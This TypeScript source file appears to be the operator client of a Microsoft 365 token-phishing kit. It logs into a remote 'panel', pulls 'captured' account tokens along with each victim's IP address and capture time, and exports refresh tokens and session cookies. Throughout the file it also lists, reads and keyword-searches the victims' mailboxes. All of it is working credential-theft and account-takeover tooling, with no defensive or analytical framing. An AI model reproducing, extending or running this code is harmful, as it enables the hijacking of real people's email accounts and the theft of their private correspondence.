import { Panel } from '../../types/panel';
import { replacePanelTag } from './accountService';

// Lazy import to avoid circular dependency
async function getWebsocketManager() {
  const { websocketManager } = await import('./websocketService');
  return websocketManager;
}



const STORE_KEY = 'panels';

// --------------------------
// Password encryption helpers
// --------------------------
export async function encryptPassword(plaintext: string): Promise<string> {
  return window.electron.safeStorage.encrypt(plaintext);
}

export async function decryptPassword(ciphertext: string): Promise<string> {
  return window.electron.safeStorage.decrypt(ciphertext);
}

// --------------------------
// Panel CRUD
// --------------------------
export async function getPanels(): Promise<Panel[]> {
  const panels = await window.electron.store.get(STORE_KEY);
  return Array.isArray(panels) ? panels : [];
}

export async function getPanel(id: string): Promise<Panel | undefined> {
  const panels = await getPanels();
  return panels.find(p => p.id === id);
}

export async function savePanels(panels: Panel[]) {
  await window.electron.store.set(STORE_KEY, panels);
}

import { normalizePanelUrl } from '../utils/url';

export async function addPanel(panel: Omit<Panel, 'id' | 'status' | 'passwordEncrypted'> & { password: string }) {
  const normalizedUrl = normalizePanelUrl(panel.url);
  const panels = await getPanels();
  const newPanel: Panel = {
    ...panel,
    url: normalizedUrl,
    id: crypto.randomUUID(),
    passwordEncrypted: await encryptPassword(panel.password),
    status: 'disconnected',
  };
  panels.push(newPanel);
  await savePanels(panels);
  return newPanel;
}

export async function updatePanel(id: string, updates: Partial<Panel> & { password?: string }) {
  const panels = await getPanels();
  const index = panels.findIndex(p => p.id === id);
  if (index === -1) throw new Error('Panel not found');
  const panel = panels[index];
  if (updates.url != null) {
    updates = { ...updates, url: normalizePanelUrl(updates.url) };
  }
  if (updates.password) {
    updates.passwordEncrypted = await encryptPassword(updates.password);
    delete updates.password;
  }
  panels[index] = { ...panel, ...updates };
  await savePanels(panels);
  return panels[index];
}

export async function deletePanel(id: string) {
  const panels = await getPanels();
  const filtered = panels.filter(p => p.id !== id);
  // Stop WebSocket connection for this panel
  (await getWebsocketManager()).stopForPanel(id);
  await savePanels(filtered);
  // Update accounts: replace panel tag (production/backup) with 'detached'
  try {
    await replacePanelTag(id, 'detached');
  } catch (err) {
    console.error('Failed to replace panel tag for accounts:', err);
    // Continue anyway
  }
}

// --------------------------
// Panel connection & API
// --------------------------
export async function testPanelConnection(url: string, username: string, password: string): Promise<string> {
  const normalizedUrl = normalizePanelUrl(url);
  const loginUrl = `${normalizedUrl}/api/auth/login`;
  const response = await window.electron.api.request({
    url: loginUrl,
    method: 'POST',
    body: { username, password },
  });
  if (!response.ok) {
    throw new Error(response.data?.error || `Login failed with status ${response.status}`);
  }
  return response.data.token;
}

/**
 * Authenticate a panel using stored credentials, update token and status.
 */
export async function authenticatePanel(panelId: string): Promise<Panel> {
  const panels = await getPanels();
  const panel = panels.find(p => p.id === panelId);
  if (!panel) throw new Error('Panel not found');
  if (!panel.passwordEncrypted) throw new Error('No password stored');

  let password = '';
  try {
    password = await decryptPassword(panel.passwordEncrypted);
  } catch (error: any) {
    const msg = String(error?.message || error || '').toLowerCase();
    if (msg.includes('decrypt') || msg.includes('ciphertext')) {
      await updatePanel(panelId, {
        status: 'error',
        error:
          'Stored panel password can no longer be decrypted on this machine/session. Re-enter the panel password in Panels and save again.',
      });
      throw new Error(
        'Stored panel password can no longer be decrypted on this machine/session. Open Panels, edit this panel, and save the password again.'
      );
    }
    throw error;
  }
  try {
    const token = await testPanelConnection(panel.url, panel.username, password);
    const updated = await updatePanel(panelId, {
      token,
      tokenExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(), // 24h
      status: 'connected',
      error: undefined,
    });
    // Start WebSocket connection for real‑time token capture
    (await getWebsocketManager()).startForPanel(panelId, updated.url).catch(err => 
      console.error(`Failed to start WebSocket for panel ${panelId}:`, err)
    );
    return updated;
  } catch (error) {
    (await getWebsocketManager()).stopForPanel(panelId);
    await updatePanel(panelId, {
      status: 'error',
      error: error instanceof Error ? error.message : String(error),
    });
    throw error;
  }
}

export async function fetchAccounts(panel: Panel) {
  if (!panel.token) throw new Error('Panel not authenticated');
  // Try captured tokens first
  const response = await window.electron.api.request({
    url: `${panel.url}/api/tokens/captured`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch captured accounts: ${response.status}`);
  }
  const data = response.data as { success: boolean; tokens: any[] };
  if (!data.success || !Array.isArray(data.tokens)) {
    throw new Error('Invalid response from panel');
  }
  // Map captured tokens to remote accounts
  return data.tokens.map((token: any) => ({
    email: token.email,
    clientId: token.client_id,
    authorityEndpoint: token.authority_endpoint || 'https://login.microsoftonline.com/common',
    refreshToken: '', // will be fetched via exportToken later
    role: '', // no role info from panel; will detect via Graph later
    status: 'active',
    name: token.email.split('@')[0],
    notes: `Captured ${token.capture_time} from ${token.ip_address}`,
    lastRefresh: token.last_refresh,
    resource: token.resource || '00000002-0000-0ff1-ce00-000000000000',
    scopeType: token.scope_type || 'ews',
  }));
}

export async function exportToken(panel: Panel, email: string) {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/mailbox/${encodeURIComponent(email)}/export-token`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Token export failed: ${response.status}`);
  }
  return response.data;
}

export type PanelExportCookiesResult =
  | { ok: true; cookies: string }
  | { ok: false; status: number; error: string };

/**
 * Optional panel route: `GET /api/mailbox/{email}/export-cookies` with panel `Authorization: Bearer`.
 * Your server should return JSON `{ "success": true, "cookies": "<netscape or header string>" }`
 * or raw text cookies. **404** means the route is not implemented yet on that panel.
 */
export async function exportMailboxCookies(panel: Panel, email: string): Promise<PanelExportCookiesResult> {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/mailbox/${encodeURIComponent(email)}/export-cookies`,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (response.status === 404) {
    return {
      ok: false,
      status: 404,
      error:
        'This panel does not expose GET /api/mailbox/{email}/export-cookies yet. Add it on your panel server to return Microsoft session cookies (Netscape or Cookie header string) for the mailbox.',
    };
  }
  if (!response.ok) {
    return {
      ok: false,
      status: response.status,
      error: `export-cookies failed: HTTP ${response.status}`,
    };
  }
  const d = response.data;
  let cookies = '';
  if (d && typeof d === 'object') {
    if (typeof (d as any).cookies === 'string') cookies = (d as any).cookies;
    else if (typeof (d as any).cookieHeader === 'string') cookies = (d as any).cookieHeader;
    else if ((d as any).success && typeof (d as any).data === 'string') cookies = (d as any).data;
  } else if (typeof d === 'string') {
    cookies = d;
  }
  cookies = String(cookies || '').trim();
  if (!cookies) {
    return { ok: false, status: response.status, error: 'Panel returned an empty cookies payload' };
  }
  return { ok: true, cookies };
}

/**
 * Fetch folders for a given account.
 * @param panel Authenticated panel
 * @param email Account email
 * @returns Array of folder objects { id, name, totalItemCount, unreadItemCount }
 */
export async function fetchFolders(
  panel: Panel,
  email: string
): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/folders`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch folders: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.folders)) {
    throw new Error('Invalid response from panel');
  }
  return response.data.folders;
}

/**
 * Fetch emails for a given account.
 * @param panel Authenticated panel
 * @param email Account email
 * @param folder Optional folder name or ID (default 'Inbox')
 * @param since Optional ISO date string to fetch emails after
 * @param limit Max number of emails (default 50)
 */
export async function fetchEmails(
  panel: Panel,
  email: string,
  folder?: string,
  since?: string,
  limit: number = 50
): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');
  
  // 1. Get folders to map folder name to ID
  const folders = await fetchFolders(panel, email);
  let folderId = folder || 'Inbox';
  // If folder is a name, try to find matching folder
  const matched = folders.find(f => f.name.toLowerCase() === folderId.toLowerCase() || f.id === folderId);
  if (matched) {
    folderId = matched.id;
  } else {
    // Fallback to first folder
    if (folders.length > 0) folderId = folders[0].id;
  }
  
  // 2. Fetch messages for the folder
  const params = new URLSearchParams();
  if (since) params.append('since', since);
  params.append('limit', limit.toString());
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/folder/${encodeURIComponent(folderId)}/messages?${params.toString()}`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Failed to fetch emails: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.messages)) {
    throw new Error('Invalid response from panel');
  }
  // Map messages to expected format (add folder field)
  return response.data.messages.map((msg: any) => ({
    ...msg,
    folder: folderId,
  }));
}

/**
 * Search emails for a given account.
 * @param panel Authenticated panel
 * @param email Account email
 * @param keywords Array of keywords to search in subject/body
 * @param folders Array of folders to search in (ignored – webpanel search does not support folder filter)
 * @param dateRange Optional { start, end } ISO date strings (ignored)
 * @param limit Max results (default 100)
 */
export async function searchEmails(
  panel: Panel,
  email: string,
  keywords: string[] = [],
  _folders: string[] = [],
  _dateRange?: { start?: string; end?: string },
  limit: number = 100
): Promise<any[]> {
  if (!panel.token) throw new Error('Panel not authenticated');
  if (keywords.length === 0) {
    // No keywords → return empty results (search requires at least 2 chars)
    return [];
  }
  const query = keywords.join(' ');
  if (query.trim().length < 2) {
    // Query too short for panel search; return empty
    return [];
  }
  const params = new URLSearchParams({
    q: query,
    limit: limit.toString(),
  });
  const url = `${panel.url}/api/webmail/account/${encodeURIComponent(email)}/search?${params.toString()}`;
  const response = await window.electron.api.request({
    url,
    method: 'GET',
    headers: { Authorization: `Bearer ${panel.token}` },
  });
  if (!response.ok) {
    throw new Error(`Search failed: ${response.status}`);
  }
  if (!response.data.success || !Array.isArray(response.data.results)) {
    throw new Error('Invalid response from panel');
  }
  // Add folder placeholder (search results don't include folder)
  return response.data.results.map((msg: any) => ({
    ...msg,
    folder: 'Search Results',
  }));
}

export async function exportTokensBatch(panel: Panel, emails: string[]) {
  if (!panel.token) throw new Error('Panel not authenticated');
  const response = await window.electron.api.request({
    url: `${panel.url}/api/tokens/export-batch`,
    method: 'POST',
    headers: { Authorization: `Bearer ${panel.token}` },
    body: { emails },
  });
  if (!response.ok) {
    throw new Error(`Batch token export failed: ${response.status}`);
  }
  return response.data;
}